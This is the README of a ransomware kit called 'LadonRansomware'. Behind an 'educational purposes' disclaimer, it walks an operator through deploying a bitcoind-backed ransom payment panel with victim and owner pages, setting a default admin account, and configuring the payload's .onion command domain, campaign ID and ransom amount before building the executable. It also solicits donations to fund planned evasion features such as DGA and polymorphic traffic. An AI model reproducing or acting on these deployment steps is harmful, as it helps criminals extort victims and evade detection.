# LadonRansomware
LadonRansomware Educational Purposes.


I am not responsible for any damages or anything that might happen from this use.


This was written mainly on love of brian krebs.


His blog can be found here:
http://krebsonsecurity.com/


This was written while looking at his picture on my desk.


Like our work?


Want to donate:

3LcaAYVEQzboDLaZDnZcx6wkBEe3SyDcEd



Setup Instructions:

Create a new SQL table and install the untitled.sql file

The User and Password of the main Admin account:


     INSERT INTO  `users` (`id` ,  `username` ,  `password` ) VALUES (1, '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918', '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918');


can be edited, Change to SHA 256 of your password and username


       INSERT INTO  `users` (`id` ,  `username` ,  `password` ) VALUES (1, 'SHA256OFUSERNAMEHERE', 'SHA256OFPASSWORDHERE');


Once you have installed the SQL file, edit config.php 


    $dsn = 'mysql:host=localhost;dbname=dbnamehere'; // define host name and database name
    $username = 'root'; // define the username
    $pwd='passhere'; // password
    
    
edit this in cart.php, owner.php, victims.php



Once this is complete

make sure the assets.zip is unzipped so you have an assets and API folder in that folder.



If you have not already installed bitcoind go ahead and do that before this.


edit this in cart.php, owner.php, victims.php, config.php



     require_once 'api/RPC/includes/jsonRPCClient.php'; 
     $bitcoin = new jsonRPCClient('http://root:passhere@127.0.0.1:8332/');


I Highly recommend you bind the port only so localhost can access it. I also recommend that you store your private key of the wallet somewhere safe! Dont want those people to steal it! I also recommend a really good bitcoind password. I also recommend that you trim the tree so you dont donwload the whole blockchain...



Now login at owner.php

Create a new account and save the user ID. Then log in with that new account. 

Now time to build the EXE.

Find this in main.c

    #define DOMAIN "ns2yrncquekngvfe.onion"
    #define CAMP 35
    #define AMOUNT 300
    
Change domain to your domain. This is your onion domain!

Change CAMP to your User ID.

Change Amount to the amount you want. ( YOu can always change amount from panel)

Now you can build!



Future ToDo:

Add polymorphic scheme to traffic. 

Make DGA.

Make IAT self-reconstruct.


Want the ToDo to be done ? Then donate!
